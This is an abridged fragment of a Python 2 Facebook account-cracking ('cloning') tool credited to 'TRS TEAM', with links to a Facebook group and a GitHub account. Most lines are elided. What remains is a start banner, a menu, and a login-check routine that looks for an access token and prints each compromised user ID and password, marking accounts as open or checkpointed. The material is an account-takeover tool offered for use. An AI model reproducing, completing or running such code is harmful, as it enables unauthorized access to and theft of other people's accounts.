...
psb('\x1b[1;32mBANGLADESH SOHEL 11 DIGIT CLONING START PLEASE WAIT ..........')
...
def menu():
    ...
    print 'AUTHOR   : TRS TEAM'

    print 'FACEBOOK : https://facebook.com/groups/439013921218692/'

    print 'GITHUB     : github.com/Sohel-Rana-X'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[Sohel-OKY]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                ...
                print '\x1b[1;93m[Sohel-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 03 Days]\x1b[0m \n'
